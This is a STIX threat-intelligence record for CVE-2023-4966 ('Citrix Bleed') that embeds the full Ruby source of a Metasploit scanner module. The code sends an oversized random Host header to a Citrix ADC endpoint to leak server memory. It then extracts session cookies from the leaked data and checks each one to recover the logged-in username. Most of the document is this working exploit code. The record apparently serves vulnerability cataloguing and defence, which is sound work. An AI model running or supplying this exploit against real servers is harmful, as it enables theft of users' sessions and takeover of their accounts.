{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1a4bcd60-628e-435d-9745-514140d92390",
    "created": "2024-08-14T16:29:18.083343Z",
    "modified": "2024-08-14T16:29:18.083346Z",
    "name": "Citrix ADC (NetScaler) Bleed Scanner",
    "description": " This module scans for a vulnerability that allows a remote, unauthenticated attacker to leak memory for a target Citrix ADC server. The leaked memory is then scanned for session cookies which can be hijacked if found. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/citrix_bleed_cve_2023_4966.rb",
            "external_id": "citrix_bleed_cve_2023_4966.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-4966"
        },
        {
            "source_name": "reference",
            "url": "https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  COOKIE_NAME = 'NSC_AAAC'.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Citrix ADC (NetScaler) Bleed Scanner',\n        'Description' => %q{\n          This module scans for a vulnerability that allows a remote, unauthenticated attacker to leak memory for a\n          target Citrix ADC server. The leaked memory is then scanned for session cookies which can be hijacked if found.\n        },\n        'Author' => [\n          'Dylan Pindur', # original assetnote writeup\n          'Spencer McIntyre' # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2023-4966'],\n          ['URL', 'https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966']\n        ],\n        'DisclosureDate' => '2023-10-25',\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => [],\n          'AKA' => ['Citrix Bleed']\n        },\n        'DefaultOptions' => { 'RPORT' => 443, 'SSL' => true }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def get_user_for_cookie(cookie)\n    vprint_status(\"#{peer} - Checking cookie: #{cookie}\")\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'logon/LogonPoint/Authentication/GetUserName'),\n      'headers' => {\n        'Cookie' => \"#{COOKIE_NAME}=#{cookie}\"\n      }\n    )\n    return nil unless res&.code == 200\n\n    res.body.strip\n  end\n\n  def run_host(_target_host)\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'oauth/idp/.well-known/openid-configuration'),\n      'headers' => {\n        'Host' => Rex::Text.rand_text_alpha(24812),\n        'Connection' => 'close'\n      }\n    )\n    return nil unless res&.code == 200\n    return nil unless res.headers['Content-Type'].present?\n    return nil unless res.headers['Content-Type'].downcase.start_with?('application/json')\n\n    username = nil\n    res.body.scan(/([0-9a-f]{32,65})/i).each do |cookie|\n      cookie = cookie.first\n      username = get_user_for_cookie(cookie)\n      next unless username\n\n      print_good(\"#{peer} - Cookie: #{COOKIE_NAME}=#{cookie} Username: #{username}\")\n      report_vuln\n    end\n\n    return if username\n\n    begin\n      JSON.parse(res.body)\n    rescue JSON::ParserError\n      print_status(\"#{peer} - The target is vulnerable but no valid cookies were leaked.\")\n      report_vuln\n    else\n      print_status(\"#{peer} - The target does not appear vulnerable.\")\n    end\n  end\n\n  def report_vuln\n    super(\n      host: rhost,\n      port: rport,\n      name: name,\n      refs: references\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-10-25"
}